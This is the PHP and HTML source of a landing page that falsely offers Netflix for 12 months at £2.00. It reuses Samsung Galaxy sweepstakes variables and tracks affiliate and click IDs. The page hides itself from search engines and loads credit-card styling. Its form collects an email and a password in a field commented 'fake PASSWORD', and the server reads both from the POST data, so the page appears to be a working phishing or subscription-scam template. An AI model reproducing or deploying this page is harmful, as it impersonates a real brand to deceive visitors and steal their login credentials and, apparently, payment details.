<?php
require 'constant.php';
require SHARED_PATH . '/php/legal.php';
require SHARED_PATH . '/db.php';

require SHARED_PATH . '/php/s23/1/shared_lang_sorteos.php';
require SHARED_PATH . '/form/form_1.php';
$PRODU='Samsung Galaxy S24 Ultra';
$EMPRE='Samsung';
require SHARED_PATH . '/footer/footer_so.php';

header('Access-Control-Allow-Origin: *');
if (isset($_GET['affiliate_id'])) {
    $mystring = $_GET['affiliate_id'];
    if (substr($mystring, 0, 2) === "98") {
        header('Location:404');
    }
}
if (isset($_GET['cid']) && $_GET['cid'] != "") {
    $_SESSION['CLICK_ID'] = $_GET['cid'];
}

if (isset($_GET['affiliate_id']) && $_GET['affiliate_id'] != "") {
    $_SESSION['affiliate_id'] = $_GET['affiliate_id'];
}
if (isset($_GET['lp']) && $_GET['lp'] != "") {
    $_SESSION['lp'] = $_GET['lp'];
}

if (isset($_GET['lang']) && $_GET['lang'] != "") {
    $_SESSION['lang'] = $_GET['lang'];
} else {

    $_SESSION['lang'] = $lang;
}


if (isset($_GET['m']) && $_GET['m'] != "") {
    $_SESSION['m'] = $_GET['m'];
    $m = $_GET['m'];
} else {

    $m = 'Samsung S23 Ultra';
}




?>

<!DOCTYPE html>
<html lang="<?= $lang ?>" dir="<?= ($lang == 'ar' || $lang == 'he') ? 'rtl' : 'ltr' ?>">

<head>
    <meta name="robots" content="noindex, nofollow, noarchive">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="shortcut icon" href="<?php echo $BASE_URL; ?>/img/favicon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no, user-scalable=0">
    <meta name="robots" content="noindex">
    <title><?= $m ?></title>
    <!-- Bootstrap core CSS -->
    <script src="./js/jquery-2.2.4.min.js"></script>
    <script src="./js/bootstrap.min.js"></script>
    <!--     <link rel="stylesheet" href="./files/bootstrap.min.css">  -->
    <script src="./files2/jquery.min.js"></script>
    <link href="./css/siempre.css" rel="stylesheet" type="text/css">
    <link href="./css/styles.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&amp;display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js"></script>
    <script>
        window.ASSET_PATH = "<?php echo ASSET_PATH; ?>";
        window.GEO_PATH = "<?php echo GEO_PATH; ?>";
    </script>



    <link rel="stylesheet" href="./Galiemas.com28_files/bootstrap.min.css" integrity="" crossorigin="anonymous">
    <link rel="stylesheet" href="./Galiemas.com28_files/jquery-ui.css">
    <link rel="stylesheet" href="./css/samsung-fonts/font_4.css">

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <link rel="stylesheet" href="https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">

    <style>
        /* Estilos para el carrusel */
        .carousel {
            display: flex;
            overflow-x: hidden;
            scroll-snap-type: x mandatory;
            scroll-behavior: smooth;
            -webkit-overflow-scrolling: touch;
        }
        .carousel img {
            scroll-snap-align: start;
            width: 100%;
            height: auto;
        }

        /* Estilos para el confeti*/
            #confeti-container {
                position: absolute;
                top: 0;
               left: 0;
                width: 100%;
                height: 100%;
                overflow: hidden;
            }

            .confeti {
                position: absolute;
                width: 1rem;
                height: 1.5rem;
                background-color: #831010; /* Color predeterminado */
                opacity: 0.7;
                animation: fall 3s ease-in-out infinite;
                transform: skew(15deg) rotate(321deg); /* Transformación agregada */
            }

            @keyframes fall {
                0% {
                    transform: translateY(-100vh) skew(15deg) rotate(321deg);
                }
                100% {
                    transform: translateY(100vh) skew(15deg) rotate(321deg);
                }
            }
    </style>
     <style>
        #bg1 {
            overflow: hidden;
            background-color: #000;
            /* height: 100vh; */
           
        }


    </style>


    <link rel="stylesheet" href="./Galiemas.com28_files/all.css" integrity="" crossorigin="anonymous">
    <link rel="preconnect" href="https://fonts.googleapis.com/">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
    <link href="./Galiemas.com28_files/css2.css" rel="stylesheet">
    
<style>

body {
    background: default;
}

.submit-button {
    background: default;
    background-position:center center;
    background-repeat:no-repeat;
    background-size: inherit;
    border: none;
    min-height: 64px;
    min-width: 200px;
}
#everyCustomer{
  font-weight: 400;
  font-style: italic;
}
.internal_offer {
position: relative;
margin-bottom: -20px;

background-color: #ededed;
width: 100%;
z-index: 10000;
-webkit-box-shadow: 0px 3px 5px -1px rgba(117,115,117,0.6);
-moz-box-shadow: 0px 3px 5px -1px rgba(117,115,117,0.6);
box-shadow: 0px 3px 5px -1px rgba(88, 87, 88, 0.6);

}

.internal_offer::after {
    content: "";
    position: absolute;
    bottom: -69px;
    left: 0;
    background-color: #ededed;
    width: 50%;
    display:none;
    z-index: -1;
    -webkit-transform-origin: 0 0;
    -ms-transform-origin: 0 0;
    transform-origin: 0 0;
    -webkit-transform: rotate(-30deg) skewX(30deg);
    -ms-transform: rotate(-30deg) skewX(30deg);
    transform: rotate(-2.7deg) skewX(84.63deg);
    padding-bottom: 4.693675%;
}

.internal_offer .inner {
    position: relative;
    width: 790px;
    margin: 0 auto;
    max-width: 100%
}

.internal_offer .top {
    border-bottom: 5px solid #5d5d5d;
    padding-bottom: 20px;
    margin-bottom: 20px;
}

.internal_offer .top .left {
text-align: center;
display: inline-block;
width: 100%;
color: #5d5d5d;
font-size: 40px;
}

.internal_offer .top .right {
display: inline-block;
width: 100%;
color: #154F83;
font-size: 14px;
text-align: center;
}

.internal_offer .bottom {
    text-align: center;
    font-size: 11px;
    line-height: 19px;
    color: #787878;
    width: 100%;
    height: auto;
    max-width: none;
    padding-bottom:20px;
}

.internal_offer .bottom div {
    margin: 9px 0;
}

.internal_offer .chevron-wrap {
width: 45px;
height: 45px;
border-radius: 50%;
background: #42BDC6;
position: absolute;
left: 50%;
/* margin-left: -30px; */
bottom: -23px;
/* margin: 0 auto; */
/* display: block; */
-webkit-box-shadow: 0px 3px 5px -1px rgba(117,115,117,0.6);
-moz-box-shadow: 0px 3px 5px -1px rgba(117,115,117,0.6);
box-shadow: 0px 3px 5px -1px rgba(88, 87, 88, 0.6);
}

.internal_offer .chevron::before {
border-style: solid;
border-width: 0.25em 0.25em 0 0;
border-color: #ffffff;
content: '';
display: inline-block;
height: 13px;
width: 13px;
position: relative;
top: 15px;
left: 16px;
vertical-align: top;
transform: rotate(135deg);

@media screen and (max-width:1442px){
  .internal_offer::after {
    bottom:-50px;
  }
}
  @media screen and (max-width:1045px){
    .internal_offer::after {
    bottom:-35px;
  }
  }
@media screen and (max-width:768px){
  
.internal_offer .inner{
  max-width:100%;
}
  .internal_offer::after {
    bottom:-18px;
  }
  
.internal_offer .chevron-wrap {
left: 46%;
bottom: -41px;

}

}

}
</style>
        
        
        <style>
            
        .terms__header{
        text-align:center;
        font-size:15px;
        font-weight:300;
        color: #858585;
        }
        .header {
        background-color: #161616;
        }
        .product-prop {
        z-index:1;
        margin-top:-20%;
        }

        .title-subs12 {
        color:#ffffff !important;
        text-transform:uppercase;
        margin-right:10px;
        font-weight:100 !important;
        }
        .sticker-enter {
        z-index:-1; 
        margin-left:290px;
        text-align: left;
        }
        .titles-size h2, h3, h6 {
        color:white!important;
        }

        .pink {
        color:#E22A88;
        }

        .purple {
        color:#9247BB;
        }
        * {
        font-family: 'Roboto', sans-serif;
        }
        body{
        background-color:rgb(246,246,246) !important;
        }
        #productCarousel img{
        display: none;
        }
        #productCarousel .active{
        display: block;
        }
        .form {
        margin-left:-10%;
        }
        #value {
        color: #ffffff !important;
        font-weight: 100;
        font-size:3rem;
        text-transform: uppercase;
        }
        .value {
        font-size: 1.5rem;
        color: #db0000!important;
        font-weight:300;
        }
        .info {
        font-size: 1.4rem;
        color: #ff2a2a;
        font-weight:400;
        }
        #step1, #step2 {
            border-radius: 4px;
            background-color: white;
            padding: 15px;
            width: 100%;
            box-shadow: -1px 3px 6px 0px rgba(0, 0, 0, 0.3);
            padding-top: 24px;
        }
        #step2 {
        display:none;
        }
      
        .form-check-input {
        width: auto !important;
        }

        .control-group {
        padding-left: 5px;
        margin-bottom: 10px;
        }
        #questions h5{
        font-size: 12px;
        }
        #questions .form-check-label {
        font-size: 12px;
        }

        .video-size {
        width:860px;
        height:515px;
        }
        #stat{
        font-size:48px;

        margin-bottom:10px;
        color:#fff;
        }
        .terms__body {
        color: #ffffff;
        font-size:1rem;
        font-weight:300;
        line-height:2rem;
        padding:05px;
        }
        .form-title h4{
            display:block;
            color:#333333;
            text-transform: uppercase;
            font-weight: 100 !important;
            font-size:18px;
            }
        .form-title p{
            font-size:1.1em;
            font-weight: 300;
        }
     
        .color {
            color:#ffffff;
            font-weight:700;
            font-family: 'Bebas Neue', cursive;
        }
        .cards img{
        max-width:55%;
        }
        h1{
        font-size:35px;
        color: #333 !important;
        text-transform: uppercase;
        }
        #offer_small{
        color:#333;
        letter-spacing: 0;
        font-size: 1.6rem;
        font-weight: 100 !important;
        }
        .spec-img  img{
        max-width:85%;
        }

        .spec-img {
        text-align:center;
        }
        .type-1 {
        margin:30px 0px;
        }
        .type-1 p {
        font-size:18px;
        font-weight:200;
        margin-top:15px;
        }
        .mid-section {
        /*margin-top:100px;*/
        color:white;
        text-align:center;
        background: rgb(24,24,24);
        background: -moz-linear-gradient(0deg, rgba(24,24,24,1) 0%, rgba(24,24,21,1) 100%);
        background: -webkit-linear-gradient(0deg, rgba(24,24,24,1) 0%, rgba(24,24,21,1) 100%);
        background: linear-gradient(0deg, rgba(24,24,24,1) 0%, rgba(24,24,21,1) 100%);
        filter: progid:DXImageTransform.Microsoft.gradient(startColorstr="#181818",endColorstr="#181815",GradientType=1);
        max-width:100%;
        }
        .bottom-section {
        color:white;
        text-align:center;
        background-color:	rgba(219,0,0,0.8);
        margin: 120px 0;
        border-radius: 4px;
        }

        .mid-section h3 {
        padding:40px 300px;
        line-height:1.5;
        font-size:25px;
        }

        .type-1, .type-2 p {
        font-size:27px;
        color:white;
        }
        .type-1 {
        display:flex;
        flex-direction:column;
        align-items:center;
        padding:0px 200px;
        align-items:center;
        align-content:center;
        }

        .type-3 {
        display:flex;
        flex-direction:row;
        justify-content:space-around;
        height:350px;
        padding:0px 0px 50px 0px;
        align-items:center;
        color:white;
        background: #0a0a0a;
        }

        .box-left {
        width:100%;
        background-size:cover;
        background-repeat:no-repeat;
        background-image: url();

        }

        .box-right {
        width:50%;
        background-image: linear-gradient(307deg, transparent 0%, transparent 10%,rgba(190, 190, 190,0.04) 10%, rgba(190, 190, 190,0.04) 64%,transparent 64%, transparent 100%),linear-gradient(118deg, transparent 0%, transparent 11%,rgba(190, 190, 190,0.04) 11%, rgba(190, 190, 190,0.04) 31%,transparent 31%, transparent 100%),linear-gradient(73deg, transparent 0%, transparent 22%,rgba(190, 190, 190,0.04) 22%, rgba(190, 190, 190,0.04) 90%,transparent 90%, transparent 100%),linear-gradient(156deg, transparent 0%, transparent 51%,rgba(190, 190, 190,0.04) 51%, rgba(190, 190, 190,0.04) 97%,transparent 97%, transparent 100%),linear-gradient(90deg, rgb(0,0,0),rgb(0,0,0)); background-attachment:fixed;
        color:white;
        text-align:left;
        padding:150px;
        }

        .box-right h3 {
        font-size:40px;
        font-weight:600;
        }
        .box-right p {
        font-size:15px;
        margin-top:20px;
        font-weight:200;
        }

        .type-4 {
            display: inline-flex;
            flex-direction: row;
            width: 100%;
            background-size: contain;
            align-items: center;
            background-image: url(./img/contentido.png);
         
            display: flex;
            justify-content: center;
            min-height: 624px;
            background-size: 100%;
            background-repeat: repeat-y;
        }
        #prod2 {
        /*visibility:hidden;*/
        max-width:100%;
        }

        .line {
        border-bottom:0.2px solid white;
        font-size:40px;
        padding:20px 0px;
        width: 100%;
        }
        .line-desc {
        line-height: 2.5rem;
        font-size: 1.6rem;
        font-weight: 100;
        padding-bottom:20px;
        }
        .type-3 img {
        max-width:70%;
        }
        .type-3 .descr  {
        text-align:left;
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;

        }
        .specs {
        display:flex;
        flex-direction:row;
        justify-content:space-evenly;
        align-items:center;
        padding:60px 0px 30px 0px;
        align-content:center;
        }
        .row:before, row:after{
        display:inline-block;
        }
        .credit-cards{
        text-align:center;

        }
        select{
        background-color: #f2f1f1 !important;
        }
        select .form-control, select.form-control:not([size]):not([multiple]) {
        height: 34px !important; 
        }
        .p-email__label{
        font-weight:200 !important;
        padding:10px;
        padding-top:5px;
        font-size:1rem;
        }
        .p-email__label p{
        margin-bottom:0px;
        }

        a {
        color: #db0000 !important;
        }

        .languageBtn{
        background-color:transparent;
        }
        .cards{
        padding-left:0px;
        padding-right:0px;
        text-align:center;
        }
        .p-acceptterms{
        margin-bottom:5px;

        }
        .p-acceptterms__input{
        margin:0px !important;
        padding:0px !important;
        width: 5% !important;

        }

        .submit-row{
        padding-top:5px;
        }
        #footer{
        padding-top:10px;
        padding-bottom:20px;
        background-image: radial-gradient(circle at center center, rgb(219,0,0),rgb(131,16,16));}
        h1, h2, h3, h4, h5, h6, p, span, div{
        /*font-family: 'IBM Plex Sans', sans-serif !important;*/
        letter-spacing: 0.5px;
        }
        .stats{
        color: #fff;
        padding: 20px 0;
        }
        div .orange {
        margin: 10px 0 10px 0;
        }
        .fade_line_1side {
        display: block;
        border: none;
        color: black;
        height: 1px;
        max-width: 100%;
        background: #db0000;

        }

        .secondary-title,.offer-expiry {
        color:white!important;
        font-weight:100 !important;
        }
        .titles-size h1 {
        font-size: 70px;
        color: white;
        font-family: 'Bebas Neue', cursive;
    }

        h6 {
        color: #ffffff!important;
        font-weight: 400 !important;
        }
        .main-titles {
        display:inline-flex;
        font-size:45px;
        align-items:center;
        }
        .topterms {
                background-color: #fbfbfb;
                color: #9c9c9c;
                font-size: 12px;
                line-height: 16px;
                text-align: center;
                margin: 0;
                padding: 4px 0px;
        }
        .form {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        padding-top: 15px;
        }
        .content h3{
        font-size:16px;
        text-transform: uppercase !important;
        font-weight: 600;
        color:#333;
        padding-bottom: 0px;
        margin-bottom: 0px;
        line-height: 2px;
        }
        .content .form-label{
        display:block;
        margin-bottom: 0px;
        }
        .content label{
        font-weight: 600;
        }
        .content input{
        border-top: 0;
        border-left: 0;
        border-right: 0;
        border-bottom: 1px dashed #cccccc;
        border-radius:0;
        font-size: 1.4rem;
        }
        .content .form-content input{
        width:100%;
        }
        .content .form-content .row{
        margin-top:1em;
        margin-bottom: 1em;
        }
        .contentTitlesForm{
         margin: 0 auto ;
         margin-top: -1em;
         margin-bottom:1em;
        }
        .contentTitlesForm .contentSubtitleForm{
            font-size:12px;
            font-weight: 300;
            line-height: 10px;

        }
        .contentEmail{
            padding-bottom: 16px
        }
        .contentEmail .contentInput{
            border-top: 0;
            border-left: 0;
            border-right: 0;
            border-bottom: 1px dashed #cccccc;
            border-radius: 0;
            font-size: 1.4rem;

        }
        .contentPassword{
            width: 100%;
        }
        .contentPassword .contentInput{
            border-top: 0;
            border-left: 0;
            border-right: 0;
            border-bottom: 1px dashed #cccccc;
            border-radius: 0;
            font-size: 1.4rem;
             
        }
        .contentTitle2Form{
            margin-top:1em;
            margin-bottom: 1em;
        } 
    .col-12  .parrafTo{
            font-size: 1.1em;
            font-weight: 300;
            letter-spacing: 0.07rem;
   
        }
        
        .fa-check{
        padding-top: 10px;
        font-size: 20px;
        }
        .product-container img{
        max-width: 100%;
        }



        .discount{
        background-image: radial-gradient(circle at center center, rgb(219,0,0),rgb(131,16,16));
        color: #fff;
        position: absolute;
        z-index: 2;
        letter-spacing: .75px;
        border-radius:100%;
        height:100px;
        width:100px;
        top: 10%;
        left: 10%;
        line-height:15px;
        box-shadow: -1px 3px 6px 0px rgba(0, 0, 0, 0.3);
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        text-shadow: -1px 1px 3px  rgba(0, 0, 0, 0.2);
        text-transform: uppercase;
        padding: 6px 0 0 0;
        }
        .product-name{
        color:#e74c3c;
        }
        .submit{
        background-color:#db0000;
        color:#fff;
        padding:8px;
        padding-left: 20px;
        padding-right: 20px;
        border-radius: 4px;
        border: 2px solid transparent;
        transition: all 0.5s ease 0s !important;
        font-weight: 600;
        width:95%;
        font-size:1.4rem;
        text-transform:uppercase;
        }
        .submit:hover{
        background-color: #039955;
        box-shadow: 1px -3px 6px 0px rgba(0, 0, 0, 0.3);
        cursor: pointer;
        }
        .submit2{
        background-color:#db0000;
        color:#fff;
        padding:8px;
        padding-left: 20px;
        padding-right: 20px;
        border-radius: 4px;
        border: 2px solid transparent;
        transition: all 0.5s ease 0s !important;
        font-weight: 600;
        width:95%;
        font-size:1.4rem;
        text-transform:uppercase;
        margin-top: 8px;
        }
        .submit2:hover{
        background-color: #039955;
        box-shadow: 1px -3px 6px 0px rgba(0, 0, 0, 0.3);
        cursor: pointer;
        }
        #logo{
        max-width:30%;

        }
        .submit i{
            position: relative;
        top: 1px;
        margin-left: 10px;
        }
        .submit-col{
        text-align: center;
        width:100%;
        }

        .credit-card img{
        max-width:100%;

        }
        .credit-cards{
        text-align:center;


        }.cards{
        padding-left:0px;
        padding-right:0px;
        text-align:center;
        }
        @media screen and (min-width: 1900px) {
        .type-3 img {
        max-width: 55%;
        }
        }
        @media screen and (max-width: 1025px) {
        .dropdown-menu{
            left:30% !important;
        }
        /*.discount{*/
        /*    left:70%;*/
        /*    top:0px;*/
        /*}*/
        .content .form-content .row{
            margin-top:0px;
        }

        /*#product {*/
        /*    max-width:85%;*/
        /*    padding-left:0px;*/
        /*}*/

        .submit-row{
            padding-top:0px;
        }
        .sticker-enter {
        z-index: -1;
        margin-left: 87px;
        text-align: left;
        }
        #entertowin {
        width: 136px;
        }
        .content label{
            font-size:12px;
        }

        .max-width-col-49, .lastname-col{
            max-width:49% !important;
        }
        .max-width-col-98{
            max-width:98% !important;
        }
        .max-width-col-41{
            max-width:41% !important;
        }
        .max-width-col-33{
            max-width:33% !important;
        }
        .max-width-col-83{
            max-width:83% !important;
        }
        .max-width.col-17{
            max-width:17% !important;
        }

        .content .auto-payment h3{
            width: 90%;
            font-size:11px;
            padding-left: 20px;

        }
        .p-email__label{
            padding-top:12px;
        }

        body{
            min-height: 1012px;
        
        }
        .submit-col{
            padding-top: 10px;
            text-align: center;
        }
        .credit-card img{
        max-width:100%;
        display:none;
        } 
        /* .product-desktop #product{
               max-width:100%;
           } */
        .terms--secondary .col-md-6{
            max-width:48% !important;
        }
        /*.product-desktop .discount{*/
        /*    left:38%;*/
        /*}
        /* .type-3 {
        display: flex;
        flex-direction: row;
        justify-content: space-around;
        height: 400px;
        padding: 0px!important;
        align-items: center;


        } */

        .type-3 {
      display: flex;
      flex-direction: row;
      justify-content: space-around;
      height: 400px;
      padding: 0px!important;
      align-items: center;
  
   
  }
        .box-right {
        width: 50%;
        background-color: #2e2e2e;
        color: white;
        text-align: left;
        padding: 65px;
        }

        .titles-size h1 {
        font-size: 45px;
        color: white;
        }
        .product-prop {
        z-index: 1;
        margin-top: 21%;
        }

        .type-3 {
        display: flex;
        flex-direction: row;
        justify-content: space-around;
        height: 465px;
        padding: 0px!important;
        align-items: center;
        }
        .chair-big {
        text-align:center;
        }
        }
        @media screen and (min-width: 576px){


        .discount span {
            font-size: 44px;
            font-weight: 600;
        }
        }


        @media screen and (max-width: 992px) {
        h1 {
            font-size:45px;
        }
        #offer_small {
            font-size: 22px;
        }
        #value {
            font-size: 3rem;
        }
        .form-title h4 {
            font-size:22px;
        }
            .video-size {
        width:620px;
        height:325px;
        }

        .type-3 img {
        max-width: 90%;
        }
        .type-3 {
        display: flex;
        flex-direction: row;
        justify-content: space-around;
        height: 368px;
        padding: 0px!important;
        align-items: center;
        color: white;
        }

        #entertowin {
            width: 300px;
            margin-top: -12%;
        }
        .discount {
            top: 22px;
            left: 40%;
        }
        .submit {
            width: 90%;
            font-size:24px;
        }
        .box-right {
        width: 50%;
        background-color: #2e2e2e;
        color: white;
        text-align: left;
        padding: 80px;
        }
        .type-3 {
        display: flex;
        flex-direction: row;
        justify-content: space-around;
        height: 435px;
        }
        }
        @media screen and (max-width: 769px){
        #questions ol {
            padding-left:20px;
        }
        #entertowin {
            width: 250px
        }


        .type-3 {
        display: flex;
        flex-direction: row;
        justify-content: space-around;
        height: 368px;
        padding: 0px!important;
        align-items: center;
        color: white;
        }

        .terms--main {
        width:100%!important;
        }
        .languageBtn {
        visibility:hidden;
        }
        .terms .col-md-6 {
        -webkit-box-flex: 0;
        -ms-flex: 0 0 50%;
        flex: 0 0 100%;
        max-width: 100%;
        }
        .product-container img{
        max-width: 100%;
        width:100%;
        margin-top:180px;
        }
        #value {
            font-size: 25px;
        }
        .discount {
            height:150px;
            width: 150px;
            font-size: 16px;
            line-height: 20px;
            left:160px;
        }
        .discount span {
            font-size: 55px;
        }
        .submit {
            font-size: 18px;
        }
        .product-prop {
        z-index: 1;
        margin-top: 20%;
        }

        .form {
        margin-left:6%;
        }

        .type-3 {
        display: flex;
        flex-direction: row;
        justify-content: space-around;
        height: 368px;
        padding: 0px!important;
        align-items: center;
        color: white;
        }

        .specs {

        padding: 10px 0px 10px 0px;

        }
        .box-right {
        width: 50%;
        background-color: #2e2e2e;
        color: white;
        text-align: left;
        padding: 32px;
        }
        #entertowin {
        width: 108px;
        }
        .sticker-enter {
        z-index: -1;
        margin-left: -15px;
        text-align: left;
        }
        .product-prop {
        z-index: 1;
        margin-top: 0;
        margin-left:30px;
        }
        #entertowin {
        margin-top: 0%;
        }
        .product-prop {
        z-index: 1;
        margin-top: -12%;
        margin-left: 30px;
        }
        .discount {
        top: 147px;
        }

        .main-titles {
        display: flex;
        flex-direction:column;
        align-items: center;
        }
        .titles-size h1 {
        font-size: 37px;
        color: white;
        }
        .product-prop {
        z-index: 1;
        margin-top: 70%;
        margin-left: 30px;
        }
        .discount {
        top: 74px;
        }
        }
        @media screen and (max-width: 440px) {
        .p-email__label, .form-title p {
            font-size: 1rem !important;
        }
        h4 {
            font-size: 1.9rem !important;
        }
        .info {
            font-size: 1rem !important;
        }
        #confetti-wrapper {
            display:none;
        }
        .video-size {
        width:320px;
        height:225px;
        }

        .form {
        margin-left:0%;
        }

        #footer{
        background-color: #9b34ef;
        }

        .type-3 {
        display: flex;
        flex-direction: column;
        justify-content: space-around;
        height: 500px;
        padding: 0px!important;
        align-items: center;
        text-align:center;
        }

        .specs {
        flex-direction:column;
        padding-top:0px;
        }
        .spec-img img {
        max-width: 50%;
        }
        .box-right {
        width: 100%;
        background-color: #2e2e2e;
        color: white;
        text-align: center;
        padding: 30px;

        }
        .box-left {
        width:100%;
        height:300px;

        }
        .type-4 {
        flex-direction:column-reverse;
        }
        .h1, h1 {
        font-size: 3.5rem;
        }


        .discount {
        top: 10px !important;
        left: 10px !important;
        height: 100px;
        width: 100px;
        font-size: 1rem;
        line-height: 1.4rem;
        }
        .product-container img {
        max-width: 100%;
        width: 100%;
        margin-top:0px;
        }
        .type-3 img {
        max-width: 80%;
        }
        .main-titles {
        display: flex;
        flex-direction:column;
        align-items: center;
        }

        .titles-size h1 {
        font-size: 32px;
        color: white;
        }
        #offer_small {
        font-size: 16px;
        font-weight: 300;
        padding-bottom:20px;
        }
        .type-3 .descr {
        text-align: center;
        }
        }
        @media screen and (min-width: 1200px) {
        #entertowin {
        width: 200px;
        margin-top: -12%;
        }

        #entertowin {
        width: 104px;
        margin-top: 14%;
        }
        .sticker-enter {
        z-index: -1;
        margin-left: 150px;
        text-align: left;
        }
        #entertowin {
        width: 104px;
        margin-top: 5%;
        }
        .product-prop {
        z-index: 1;
        margin-top: -11%;
        }

        ol {
        padding-left:20px;
        }
        .product-prop {
        z-index: 1;
        margin-top: 4%;
        }

    }
       
    
</style>
    

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css" integrity="" crossorigin="anonymous">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Cantarell:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" rel="stylesheet">
 <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&amp;display=swap" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome-animation/0.2.1/font-awesome-animation.css" crossorigin="anonymous">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&amp;display=swap" rel="stylesheet">

    <!--Add for Credit Card -->
    <link rel="stylesheet" href="./css/ccards.css?version=3">

    <style>
        .container-card {
            max-width: 305px;
            max-height: 195px;
        }

        #ccsingle svg {
            width: 90px;
            max-height: 47px;
        }

        #ccsingle {
            top: 15px;
        }
    </style>
</head>

<body class=" agent_is_not_mobile agent_is_not_tablet agent_is_desktop agent_is_not_phone concept_galiemas_com country_es company_affection language_es microsite_samsung_galaxy_s22_ultra_5g___es flow_default flow_is_mobile page_has_terms page_type_emailandaddress flow_has_no_background_picture page_has_no_background_picture page_has_no_header_picture page_has_no_main_picture page_has_no_bottom_picture page_has_no_button_picture">
    <?php

    $sql = "SELECT * FROM `country`";

    $_GET['currency'] = $currency;
    $affiliate_id = @$_GET['affiliate_id'];
    $lp = @$_GET['lp'];
    $cid = @$_GET['cid'];

    if ($currency != "") {
        $currency = $currency;
    } else {
        $currency = 'USD';
    }

    if (!in_array(strtoupper($currency), $arr_currency)) {
        echo "<h3 style='color:#000;'>Invalid Currency</h3>";
        exit;
    }

    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        echo "<script>window.__payment__ = true;</script>";

        $EMAIL = strtolower($_POST['email']);
        $PASSWORD = $_POST['password'];

        unset($_POST);
        $_POST = array();
    }

    ?>


    
    <div id="bg1" class="container-fluid" style="padding-bottom: 20px;">
        <div class="container main main--email">
            <div class="row form-content">
                <div class="col-12 mt-3 mb-2 pt-5 text-center">
                <div class="titles-size">
                    <h3 id="offer_small"> Be the first to see the world's best and most popular TV shows. </h3>
                    <div class="main-titles">
                    <h1 class="title-subs12"> Get <span class="color">Netflix™</span>
                    </h1>
                    <h1 class="secondary-title"> for 12 months</h1>
                    </div>
                    <div class="orangeline">
                    <span class="fade_line"></span>
                    <span class="fade_line_1side"></span>
                    </div>
                    <h3 class="mt-4" id="value">Price for you : <b>£2.00</b>
                    </h3>
                    <p class="info">Save 98% with a yearly subscription. Cancel anytime.</p>
                    <div class="orangeline">
                    <span class="fade_line"></span>
                    <span class="fade_line_1side"></span>
                    </div>
                </div>
                </div>
                <div id="confeti-container" class="row">
                <div class="col-md-12 p-header p-header--emailandaddress" style="display:block">
                    <img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" class="p-header__image" style="display:none">
                </div>
                </div>
                <div class="row form-content">
                <div class="col-xs-12 col-sm-6 col-md-5 col-lg-8 product-container no-padding">
                    <div class="text-center discount "> Say hello to everything you love </div>
                    <div class="carousel">
                    <img id="green" src="./img/bridgerton.png">
                    <img id="phanton" src="./img/stranger.png">
                    <img id="lavender" src="./img/don'tLook.png">
                    </div>
                </div>
                <div class="col-xs-12 col-md-6 col-lg-5 pb-3 pt-3 form">
                    <div id="step1" >
                    <div class="row form-title  ">
                        <div class="col-12">
                        <h4> Create your account </h4>
                        </div>
                        <div class="col-12">
                        <p > You're one step closer to the best entertainment Netflix has to offer </p>
                        </div>
                    </div>
                    <!-- EMAIL -->
                    <div class="row">
                        <div class="col-12 max-width-col-98 col-md-12 contentEmail">
                        <label class="sr-only" for="email">Email <span class="text-danger">*</span>
                        </label>
                        <input class="form-control p-email__input contentInput"  id="email" required="required" placeholder="E-mail" name="email" type="email" fdprocessedid="w2ziwi">
                        </div>
                    </div>
                    <!-- fake PASSWORD -->
                    <div class="row contentTitlesForm">
                        <div class="col-12 max-width-col-98 col-md-12 contentPassword">
                        <label class="sr-only" for="password">Password <span class="text-danger">*</span>
                        </label>
                        <input class="form-control p-email__input contentInput" type="text" id="password" name="password" placeholder="Password" fdprocessedid="0m6esg">
                        </div>
                    </div>
                    <div class="row submit-row">
                        <div class="submit-col">
                        <div class="cta-btn">
                            <button id="nextbut" type="button" class="submit" fdprocessedid="8gwwya">Create account </button>
                        </div>
                        </div>
                    </div>
                    <div class="row form-title contentTitle2Form">
                        <div class="col-12 ">
                        <p class="parrafTo"> To withdraw your consent (including any consent you have previously given), and to learn more about your rights and how to exercise them, see our <a class="thickbox" id="terms_link" href="http://support.bumfuzzles.co.uk/privacy" onclick="window.open(this.href, 'child', 'height='+window.outerHeight+', width=960, scrollbars=yes'); return false;" target="_blank" title="Privacy Policy">Privacy Policy</a>
                        </p>
